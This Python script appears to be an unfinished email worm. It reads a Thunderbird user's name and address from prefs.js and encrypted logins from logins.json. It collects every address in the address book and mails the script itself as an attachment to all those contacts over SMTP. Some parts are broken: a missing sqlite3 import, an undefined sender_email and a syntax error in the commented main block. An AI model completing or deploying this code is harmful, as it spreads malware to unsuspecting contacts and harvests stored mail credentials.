#!/usr/bin/python

import os
import smtplib
import email
import distutils.spawn
import re
# import getpass
import json

from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE # Value: ", "

import filewriter


THUNDERBIRD = "Thunderbird"
OUTLOOK = "Outlook"
SSL = "SSL"
TLS = "TLS"
STARTTLS = "STARTTLS"

# The absolute filename of the user's Thunderbird default profile directory:
thunderbird_profile_dir = None


# Copied from filewriter.py (changed returned file path)
def users_home_dir():
    """
    :returns: the user's home directory on Unix, Windows and MacOS systems
              as string value.
    """
    # return os.path.expanduser("~") # platform-independent user's home directory
    # return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes
    return "/home/telekobold/TestVerzeichnis" # For testing purposes


def determine_installed_mail_client():
    """
    Checks if one of the mail clients "Mozilla Thunderbird" or 
    "Microsoft Outlook" is installed on the local system.
    
    :returns: "Thunderbird" or "Outlook" if the respective programm is installed 
              on the local system, `None` otherwise.
    """
    if distutils.spawn.find_executable("thunderbird") is not None:
        return THUNDERBIRD
    elif distutils.spawn.find_executable("outlook") is not None:
        return OUTLOOK
    # TODO: Add support for more email clients
    return None


def find_default_profile_dir_thunderbird():
    """
    Searches for the Thunderbird default profile directory on the user's system
    and stores its value in `thunderbird_profile_dir` if the directory could be 
    found.
    
    :return: the Thunderbird default profile directory as string
             or `None` if no such directory could be found.
    """
    global thunderbird_profile_dir
    # TODO: Substitute the temporary `thunderbird_dirname` (which is only for
    # testing purposes):
    # thunderbird_dirname = os.path.join(users_home_dir(), ".thunderbird")
    thunderbird_dirname = os.path.join(users_home_dir(), "thunderbird-Kopie")
    # The name of the profile directory consists of 8 letters or digits, 
    # followed by the string ".default-release":
    profile_dir_regex = re.compile("[0-9a-z]{8}\.default-release")
    
    if os.path.isdir(thunderbird_dirname):
        for file in os.listdir(thunderbird_dirname):
            absolute_filename = os.path.join(thunderbird_dirname, file)
            if os.path.isdir(absolute_filename) and profile_dir_regex.match(file):
                # TODO: Often, it can happen that several profile dirs exist 
                # (and thus, `profile_dir_regex` also matches to several 
                # directories). => It should be checked which of this profiles 
                # is currently used in Thunderbird, probably by using 
                # Thunderbird's profiles.ini file which is located directly
                # in the .thunderbird directory (just like the profile 
                # directories).
                # test output:
                # print("find_default_profile_dir_thunderbird(): " + absolute_filename)
                thunderbird_profile_dir = absolute_filename
    else:
        thunderbird_profile_dir = None
        
    return thunderbird_profile_dir


def search_file_in_default_dir(filename):
    """
    Searches for a file in the user's default Thunderbird profile directory.
    
    :filename: the relative file name of the file to be searched; must be of 
               type `str`.
    :return:   the absolute file name to the searched file as string value 
               if the file could be found, `None` otherwise.
    """
    # If thunderbird_profile_dir is `None`, initialize it. If it is still 
    # `None`, no Thunderbird default profile directory could be found.
    if not thunderbird_profile_dir:
        find_default_profile_dir_thunderbird()
    if not thunderbird_profile_dir:
        print("The file " + filename + " could not be found!")
        return None
    absolute_filepath = os.path.join(thunderbird_profile_dir, filename)
    if os.path.isfile(absolute_filepath):
        return absolute_filepath
    return None


def read_sender_name_and_email_thunderbird():
    """
    Searches for the full name and email address in the user's Thunderbird
    default profile. This is usually the full name and email address the user
    first typed in when setting up Thunderbird.
    
    :returns: A tuple containing the user's full name and email adddress as 
              `str` values. These values can each be `None` if no corresponding 
              value could be found.
    """
    # The user's full name is stored in the variable "mail.identity.id1.fullName", 
    # the user's email address in the variable "mail.identity.id1.useremail" in 
    # the file "prefs.js" in the user's Thunderbird profile.
    
    user_name = None
    user_email = None
    prefs_js_filename = search_file_in_default_dir("prefs.js")
    
    if prefs_js_filename: # if prefs_js_filename is not `None`
        lines = filewriter.read_text_file_to_dict(prefs_js_filename)
        user_name_regex = r", \"(.+?)\"\);"
        # Regex matching all possible email addresses:
        # email_regex = TODO
        # Email regex including a leading '"' and a trailing '");':
        # email_regex_incl = "\"" + email_regex + "\");"
        email_regex_incl = user_name_regex
        # Search the file "prefs.js" for the user's name:
        for i in lines:
            if "mail.identity.id1.fullName" in lines[i]:
                # A string.endsWith(substring) check would be better, 
                # but a regular expression should be checked here 
                # instead of a fixed substring...
                user_name_match = re.search(user_name_regex, lines[i])
                if user_name_match:
                    user_name_raw = user_name_match.group()
                    # Remove the leading '"' and the trailing '");' 
                    # to obtain the user name:
                    user_name = user_name_raw[3:len(user_name_raw)-3:1]
                    break # Break the loop since the searched user name was found.
        # Search the file "prefs.js" for the users' email address:
        for i in lines:
            if "mail.identity.id1.useremail" in lines[i]:
                user_email_match = re.search(email_regex_incl, lines[i])
                if user_email_match:
                    user_email_raw = user_email_match.group()
                    user_email = user_email_raw[3:len(user_email_raw)-3:1]
                    break # Break the loop since the search user email address 
                          # was found.
                
    return (user_name, user_email)


def gen_dict_extract(searched_key, searched_elem):
    """
    Recursively searches the passed `searched_elem` (which should be a 
    dictionary) for the passed `searched_key`.
    
    Taken from from https://stackoverflow.com/questions/9807634/find-all-occurrences-of-a-key-in-nested-dictionaries-and-lists 
    
    :searched_key:  the key to search for; must have type `str`.
    :searched_elem: the element which should be searched. Must be of type `dict`
                    when calling this function. Can contain arbitrarily nested 
                    dictionaries.
    :returns:       a generator yielding all values having the passed 
                    `search_key` from arbitrary nesting depths.
    """
    # Only continue to search for `searched_key` if the passed `searched_elem`
    # is of type `dict`.
    # But this prevents users from 
    # if hasattr(searched_elem, "items"):
    # if type(searched_elem) is dict:
    # if isinstance(searched_elem, dict):
    if not isinstance(searched_elem, dict):
        print("The passed `searched_elem` must be a Python dictionary!")
        return None
    else:
        for k, v in searched_elem.items():
            if k == searched_key:
                yield v
            if isinstance(v, dict):
                for result in gen_dict_extract(searched_key, v):
                    yield result
            elif isinstance(v, list):
                for d in v:
                    for result in gen_dict_extract(searched_key, d):
                        yield result
                        
                        
def flat_search_dict(searched_key, input_dict):
    """
    Searches the top level of a dictionary for the passed `searched_key`
    and returns its corresponding value.
    
    :return: the value to the passed `searched_key` if this `searched_key`
             could be found.
    """
    if not isinstance(input_dict, dict):
        print("The passed `input_dict` must be a Python dictionary!")
    else:
        for k, v in input_dict.items():
            if k == searched_key:
                return v
                        
                        
def gen_dict_extract_special(searched_key_1, searched_value_1, searched_key_2, searched_key_3, searched_elem):
    """
    Adapted version of `gen_dict_extract()`: If `searched_key_1` was found 
    and has the passed `searched_value_1` or ends with the passed 
    `searched_value_1`, search the same dictionary layer for `searched_key_2` 
    and `searched_key_3` and return their values.
    
    :returns: the values belonging to `searched_key_2` and `search_key_3`
              if the conditions described above are met.
    """
    if not isinstance(searched_elem, dict):
        print("The passed `searched_elem` must be a Python dictionary!")
        return None
    else:
        for k, v in searched_elem.items():
            if k == searched_key_1 and v.endswith(searched_value_1):
                v_2 = flat_search_dict(searched_key_2, searched_elem)
                v_3 = flat_search_dict(searched_key_3, searched_elem)
                return v_2, v_3
            if isinstance(v, dict):
                for result in gen_dict_extract_special(searched_key_1, searched_value_1, searched_key_2, searched_key_3, v):
                    return result
            elif isinstance(v, list):
                for d in v:
                    for result in gen_dict_extract_special(searched_key_1, searched_value_1, searched_key_2, searched_key_3, d):
                        return result


def read_sender_username_and_password_thunderbird(host_name):
    """
    Searches the file "logins.json" in the user's Thunderbird default profile 
    directory for "httpRealm" keys containing a value that ends with the past 
    host name. Returns the values of the associated  "encryptedUsername" and 
    "encryptedPasswords" keys as tuple.
    
    TODO: Check if those passwords can be encrypted if the user types its
    master password.
    
    :host_name: the host name; must be of type `str`.
    :returns: a tuple containing the described values, each of type `str`.
    """
    logins_json_filepath = search_file_in_default_dir("logins.json")
    print("logins_json_filepath = " + logins_json_filepath)
    with open(logins_json_filepath) as ljf:
        ljf_data = json.load(ljf)
    # return (encrypted_username, encrypted_password):
    return gen_dict_extract_special("httpRealm", host_name, "encryptedUsername", "encryptedPassword", ljf_data)


def read_email_addresses_thunderbird():
    """
    :returns: a list of all email addresses as string values contained in 
               Thunderbird's "abook.sqlite" database if this database exists, 
              `None` otherwise.
    """
    # TODO: Search for `abook.sqlite` on the file system
    # using `filewriter.users_home_dir()`.
    database = "/home/telekobold/TestVerzeichnis/TestVerzeichnis/PythonTest/abook.sqlite"
    con = None
    email_addresses = []
    
    if os.path.isfile(database):
        with sqlite3.connect(database) as con:
            with con:
                cur = con.cursor()
                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
                rows = cur.fetchall()
                for row in rows:
                    (email_addr,) = row # unpack the tuple returned by fetchall()
                    email_addresses.append(email_addr)
            return email_addresses
    else:
        return None


def determine_smtp_server(email_address):
    """
    :email_address: the email address for which the SMTP server data should be 
                    found; must be of type `str`.
    :return:        a tuple of string values containing the URL of the SMTP 
                    server and the  authentication method to the specified 
                    `email_address`.
    """
    smtp_servers = {"gmx.net" : ("mail.gmx.net", SSL), "web.de" : ("smtp.web.de", SSL), "gmail.com" : ("smtp.gmail.com", SSL)}
    aliases = {"gmx.de" : "gmx.net", "gmx.ch" : "gmx.net", "gmx.at" : "gmx.net"}
    
    for s in smtp_servers:
        if email_address.endswith(s):
            return smtp_servers[s]
        
    for a in aliases:
        if email_address.endswith(a):
            return smtp_servers[aliases[a]]


def send_mail_mime(smtp_server_url, encryption_method, password, to):
    """
    Sends a plaintext email containing this script as attachment.
    
    :smtp_server_url:   the URL of the SMTP server; must be of type `str`.
    :encryption_method: the encryption method to use. Can bei either "SSL" 
                        ("TLS") or "STARTTLS".
    :password:          the password that is used for the authentication on the 
                        SMTP server
    :to:                a list containing all recipient addresses
    """
    # TODO: Include functionality to also send the sender's name
    
    # TODO: Realize with enum or constants:
    if encryption_method != SSL and encryption_method != STARTTLS:
        print("No valid encryption_method was specified!")
        return
    
    # TODO: Adapt values:
    subject = "Test"
    body = "This is a test mail"
    msg = MIMEMultipart() # Contains the whole email
    
    # Build (parts of) the header and the text/plain body:
    msg["From"] = sender_email
    msg["To"] = COMMASPACE.join(to)
    msg["Date"] = email.utils.formatdate(localtime=True)
    msg["Subject"] = subject
    # msg["Bcc"]
    msg.attach(MIMEText(body, "plain")) # Add the body to the message
    
    # Build a base64-encoded body consisting of a text/x-python attachment 
    # containing the content of this python script:
    with open(os.path.realpath(__file__), "r") as attachment_file:
        attachment_part = MIMEText(attachment_file.read(), "x-python", _charset="utf-8")
    email.encoders.encode_base64(attachment_part)
    attachment_part.add_header("Content-Disposition", "attachment", filename=os.path.basename(__file__))
    # Add the attachment to the message:
    msg.attach(attachment_part)
    
    whole_email_text = msg.as_string() # Convert the whole email to a single string
    
    if encryption_method == SSL:
        send_mail_ssl(smtp_server_url, sender_email, password, to, whole_email_text)
    elif encryption_method == STARTTLS:
      send_mail_starttls(smtp_server_url, sender_email, password, to, whole_email_text)
        
        
def send_mail_ssl(smtp_server_url, sender_email, password, to, whole_email_text):
    """
    Sends an email using SSL.
    
    # TODO: document missing parameters
    :returns: 0 in case of success, 1 in case of error
    """
    
    # TODO: Ggf. Ports nochmal überarbeiten oder sogar spezifisch einzelnen Anbietern zuordnen
    port = 465

    with smtplib.SMTP_SSL(smtp_server_url, port) as smtp_server:
        # smtp_server.ehlo()
        try:
            l = smtp_server.login(sender_email, password)
            print("l = {}\n".format(l)) # test output
        except Exception as l_ex:
            # TODO: raise specific exception
            print("Exception thrown when trying to login!", l_ex) # test output
            return 1
        try:
            smtp_server.sendmail(sender_email, to, whole_email_text)
        except Exception as s_ex:
            # TODO: raise specific exception
            print("Exception thrown when trying to send mail!", s_ex) # test output
            return 1

    
    print ("Email sent successfully!") # test output
    return 0


def send_mail_starttls(smtp_server_url, sender_email, password, to, whole_email_text):
    """
    Sends an email using STARTTLS.
    """
    
    # TODO: If necessary, revise ports again or even assign them specifically to 
    # individual email providers.
    starttls_smtp_port = 587

    with smtplib.SMTP(smtp_server_url, starttls_smtp_port) as smtp_server:
        # smtp_server.ehlo()
        try:
            smtp_server.starttls()
            # smtp_server.ehlo()
        except Exception as e:
            print("Exception thrown when trying to create starttls connection!", e) # test output
            return 1
        try:
            l = smtp_server.login(sender_email, password)
            print("l = {}\n".format(l)) # test output
        except Exception as l_ex:
            print("Exception thrown when trying to login!", l_ex) # test output
            return 1
        try:
            smtp_server.sendmail(sender_email, to, whole_email_text)
        except Exception as s_ex:
            print("Exception thrown when trying to send mail!", s_ex) # test output
            return 1
        
    print ("Email sent successfully!") # test output
    return 0


def send_mail_plain():
    """
    Sends a plaintext email.
    """
    smtp_server_url = "smtp.gmail.com"
    port = 465
    sender_email = "s@s"
    password = ""
    # password = input("Email password:")
    # password = getpass.getpass("Email password:")
    to = ["a@s", "b@s", "c@s"]
    subject = "Test"
    body = "This is a test mail"
    email_text = "From: {}\nTo: {}\nSubject: {}\n{}".format(sender_email, COMMASPACE.join(to), subject, body)
    error_thrown = False

    smtp_server = smtplib.SMTP_SSL(smtp_server_url, port)
    # smtp_server.ehlo()

    try:
        l = smtp_server.login(sender_email, password)
        print("l = {}\n".format(l)) # test output
    except Exception as l_ex:
        print("Exception thrown when trying to login!", l_ex) # test output
        error_thrown = True

    try:
        smtp_server.sendmail(sender_email, to, email_text)
    except Exception as s_ex:
        print("Exception thrown when trying to send mail!", s_ex)
        error_thrown = True

    smtp_server.close()
    if not error_thrown:
        print ("Email sent successfully!")


if __name__ == "__main__":
    """
    print(determine_installed_mail_client())
    print(read_sender_name_and_email_thunderbird())
    print(read_sender_name_and_email_thunderbird()[0])
    print(read_sender_name_and_email_thunderbird()[1])
    """
    
    # TODO: Fix bugs:
    # - only the first "httpRealm" dictionary entry seems to be found 
    #   if it matches to the past string.
    # - only the encrypted username is returned, but not the encrypted passwort
    t = read_sender_username_and_password_thunderbird("mailbox.org")
    print("type(t) = " + str(type(t))) # TODO: is `str` instead of `tuple`!
    print(t)
    
    """
    mail_client = determine_installed_mail_client()
    # TODO: Define behaviour if `None` is returned for one of the following
    # values:
    if mail_client == THUNDERBIRD:
        sender_name, sender_email = read_sender_name_and_email_thunderbird()
        password = read_sender_password_thunderbird()
        to = read_email_addresses_thunderbird()
    elif mail_client = OUTLOOK:
        # TODO
    smtp_server_url, encryption_method = determine_smtp_server(sender_email)
    
    send_mail_mime(smtp_server_url, encryption_method, password, to)
    """

